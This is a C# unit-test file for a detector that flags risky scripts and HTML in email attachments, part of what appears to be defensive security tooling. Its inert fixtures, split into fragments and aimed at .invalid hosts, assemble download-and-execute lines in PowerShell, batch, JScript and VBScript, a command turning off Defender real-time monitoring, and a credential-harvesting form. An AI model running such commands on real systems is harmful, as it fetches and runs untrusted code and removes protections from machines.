using OnlyWorkspace.Core.Security;

namespace OnlyWorkspace.Tests;

/// <summary>
/// Inert fixtures: the scripts are text that is never run, the hosts are .invalid, and the risky commands are
/// assembled at run time so that the test sources hold no complete download-and-run line.
/// </summary>
public class ScriptStaticRulesTests
{
    private static string J(params string[] parts) => string.Concat(parts);
    private static readonly string Iex = J("Invoke-", "Expression");
    private static readonly string Iwr = J("Invoke-", "WebRequest");

    private static AttachmentInspection Inspect(string text, ScriptStaticRules.Language language)
    {
        var result = new AttachmentInspection();
        ScriptStaticRules.Inspect(text, language, string.Empty, result);
        return result;
    }

    private static IEnumerable<string> Rules(AttachmentInspection result) => result.Findings.Select(f => f.Rule);

    [Fact]
    public void PowerShell_DownloadThroughAVariableThenRun_IsLinked_WithLineAndSnippet()
    {
        var script = "$u = 'https://example.invalid/a.txt'\n$r = " + Iwr + " -Uri $u -UseBasicParsing\n" + Iex + " $r.Content\n";
        var result = Inspect(script, ScriptStaticRules.Language.PowerShell);
        var finding = Assert.Single(result.Findings, f => f.Rule == "script.download-exec");
        Assert.Equal(3, finding.Line);
        Assert.Equal(Iex + " $r.Content", finding.Snippet);
        Assert.DoesNotContain("script.download", Rules(result));
    }

    [Fact]
    public void PowerShell_PipelineOfDownloadIntoExecution_IsLinked()
    {
        var result = Inspect(J("iwr https://example.invalid/s", " | ", "iex"), ScriptStaticRules.Language.PowerShell);
        Assert.Contains("script.download-exec", Rules(result));
    }

    [Fact]
    public void PowerShell_DownloadToFileThenStartThatFile_IsLinked_ButStartingSomethingElseIsNot()
    {
        var linked = Inspect(Iwr + " https://example.invalid/t.exe -OutFile $env:TEMP\\t.exe\nStart-Process $env:TEMP\\t.exe", ScriptStaticRules.Language.PowerShell);
        Assert.Contains("script.download-exec", Rules(linked));

        var separate = Inspect(Iwr + " https://example.invalid/report.csv -OutFile C:\\dati\\report.csv\nStart-Process notepad.exe", ScriptStaticRules.Language.PowerShell);
        Assert.DoesNotContain("script.download-exec", Rules(separate));
        Assert.Contains("script.download", Rules(separate));
        Assert.Contains("script.exec", Rules(separate));
    }

    [Fact]
    public void CommandsInCommentsAndStrings_AreNotOperations()
    {
        var script = "# Esempio didattico: " + Iex + " (" + Iwr + " https://example.invalid)\n" +
                     "<# blocco:\n" + Iex + " $x\n#>\n" +
                     "Write-Host \"Non usare " + Iex + " con " + Iwr + "\"\n" +
                     "$nota = '" + Iwr + " | iex'\n";
        var result = Inspect(script, ScriptStaticRules.Language.PowerShell);
        Assert.Empty(result.Findings);
    }

    [Fact]
    public void AdministrativeScript_OnlyStartsPrograms_AndStaysContext()
    {
        var script = "Get-ChildItem C:\\Temp -Filter *.log | Remove-Item -WhatIf\nStart-Process notepad.exe -ArgumentList 'C:\\Temp\\note.txt'\n";
        var result = Inspect(script, ScriptStaticRules.Language.PowerShell);
        Assert.Equal(new[] { "script.exec" }, Rules(result));
        Assert.Equal(ObservationKind.Context, InspectionRules.Describe("script.exec")!.Value.Kind);
    }

    [Fact]
    public void PowerShell_HiddenEncodedAndDefenseChanges_AreRecognised()
    {
        var encoded = J("powershell.exe -NoProfile -W", "indowStyle Hidden -Enc", "odedCommand ", "SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA=");
        var result = Inspect("Start-Process " + encoded + "\n" + J("Set-MpPreference -Disable", "RealtimeMonitoring $true"), ScriptStaticRules.Language.PowerShell);
        Assert.Contains("script.encoded", Rules(result));
        Assert.Contains("script.hidden-exec", Rules(result));
        Assert.Contains("script.defense-change", Rules(result));
    }

    [Fact]
    public void PowerShell_Obfuscation_IsAnAttentionAndALimit()
    {
        var chars = string.Concat(Enumerable.Range(0, 10).Select(i => "[char]" + (65 + i) + "+"));
        var result = Inspect("$c = " + chars + "''\n", ScriptStaticRules.Language.PowerShell);
        Assert.Contains("script.obfuscated", Rules(result));
        Assert.Contains(result.Limits, l => l.Reason == "obfuscated");
    }

    [Fact]
    public void Batch_DownloadThenRunTheFile_IsLinked_RemarksAreNot()
    {
        var script = "@echo off\nrem " + J("certutil -urlcache -f ", "https://example.invalid/a.exe a.exe") + "\n" +
                     J("bitsadmin /transfer job https://example.invalid/b.exe ", "%TEMP%\\b.exe") + "\n" +
                     "start \"\" %TEMP%\\b.exe\n";
        var result = Inspect(script, ScriptStaticRules.Language.Batch);
        var finding = Assert.Single(result.Findings, f => f.Rule == "script.download-exec");
        Assert.Equal(4, finding.Line);
        Assert.DoesNotContain(result.Findings, f => f.Line == 2);
    }

    [Fact]
    public void Batch_PowerShellCommandLine_IsReadWithPowerShellRules()
    {
        var result = Inspect(J("powershell -w hidden -c \"", Iex, " (", Iwr, " https://example.invalid/x)\""), ScriptStaticRules.Language.Batch);
        Assert.Contains("script.download-exec", Rules(result));
        Assert.Contains("script.hidden-exec", Rules(result));
    }

    [Fact]
    public void JScript_HttpResponseEvaluated_IsLinked()
    {
        var script = J("var x = new ActiveXObject(\"MSXML2.", "XMLHTTP\");\n") +
                     "x.open(\"GET\", \"https://example.invalid/p\", false); x.send();\n" +
                     J("ev", "al(x.responseText);\n");
        Assert.Contains("script.download-exec", Rules(Inspect(script, ScriptStaticRules.Language.JScript)));
    }

    [Fact]
    public void VBScript_SavedDownloadRunHidden_IsLinked_CommentsAreNot()
    {
        var script = J("Set h = CreateObject(\"MSXML2.", "XMLHTTP\")\n") +
                     "h.Open \"GET\", \"https://example.invalid/u.exe\", False : h.Send\n" +
                     "Set s = CreateObject(\"ADODB.Stream\") : s.Open : s.Type = 1 : s.Write h.responseBody\n" +
                     "s.SaveToFile \"C:\\Users\\Public\\u.exe\", 2\n" +
                     "' CreateObject(\"WScript.Shell\").Run \"C:\\Users\\Public\\u.exe\", 0\n" +
                     J("CreateObject(\"WScript.", "Shell\").Run \"C:\\Users\\Public\\u.exe\", 0\n");
        var result = Inspect(script, ScriptStaticRules.Language.VBScript);
        var finding = Assert.Single(result.Findings, f => f.Rule == "script.download-exec");
        Assert.Equal(6, finding.Line);
    }

    [Fact]
    public void EncodedScriptHostFiles_AreALimit()
    {
        var result = Inspect("#@~^GAAAAA==W!x^DkKxPmOD/M2.mDSDA==^#~@", ScriptStaticRules.Language.VBScript);
        Assert.Contains(result.Limits, l => l.Reason == "encoded-script");
    }

    [Fact]
    public void LongScripts_StopAtTheLimit_WithAPartialLimit()
    {
        var result = Inspect(new string(' ', ScriptStaticRules.MaxChars + 10), ScriptStaticRules.Language.PowerShell);
        Assert.Contains(result.Limits, l => l.Reason == "text-limit");
    }

    [Fact]
    public void HtmlPage_PasswordFormToAnotherSite_RedirectAndLinks()
    {
        var html = "<html><body>\n<form action=\"https://login.example.invalid/p\">\n<input type=\"password\" name=\"p\"></form>\n" +
                   "<a href=\"https://evil.example.invalid/x\">www.banca.it</a>\n<script>window.location.href = 'https://other.example.invalid/';</script>\n</body></html>";
        var result = new AttachmentInspection();
        HtmlActiveContent.Inspect(html, "modulo.html", result);
        Assert.Contains("html.password-external", Rules(result));
        Assert.Contains("html.redirect", Rules(result));
        Assert.Contains("html.script", Rules(result));
        Assert.Contains(result.Links, l => l.Text == "www.banca.it" && l.Destination == "https://evil.example.invalid/x");
        Assert.All(result.Findings, f => Assert.Equal("modulo.html", f.File));
    }

    [Fact]
    public void HtmlPage_LocalPasswordFieldWithoutDestination_IsAttentionOnly()
    {
        var result = new AttachmentInspection();
        HtmlActiveContent.Inspect("<form><input type=password></form>", string.Empty, result);
        Assert.Contains("html.password", Rules(result));
        Assert.DoesNotContain("html.password-external", Rules(result));
    }

    [Fact]
    public void EmailBodyInsideAnAttachment_GivesLinksOnly()
    {
        var result = new AttachmentInspection();
        HtmlActiveContent.Inspect("<script>window.location='https://x.invalid/'</script><a href='https://y.invalid/'>y</a>", "inoltro.eml", result, bodyOnly: true);
        Assert.Empty(result.Findings);
        Assert.Single(result.Links);
        Assert.Equal(0, result.Inspected);
    }

    [Theory]
    [InlineData("ps1", ScriptStaticRules.Language.PowerShell)]
    [InlineData("JS", ScriptStaticRules.Language.JScript)]
    [InlineData("vbe", ScriptStaticRules.Language.VBScript)]
    [InlineData("cmd", ScriptStaticRules.Language.Batch)]
    public void LanguageFollowsTheExtension(string extension, ScriptStaticRules.Language language)
    {
        Assert.Equal(language, ScriptStaticRules.LanguageOf(extension));
        Assert.Null(ScriptStaticRules.LanguageOf("txt"));
    }

    [Fact]
    public void EveryRuleHasAMeaning()
    {
        foreach (var rule in new[] { "script.download-exec", "script.hidden-exec", "script.defense-change", "script.encoded", "script.obfuscated",
                     "script.download", "script.exec", "html.script", "html.password", "html.password-external", "html.redirect",
                     "pdf.javascript", "pdf.launch", "ooxml.remote-template" })
            Assert.NotNull(InspectionRules.Describe(rule));
        Assert.Null(InspectionRules.Describe("testo libero"));
    }
}
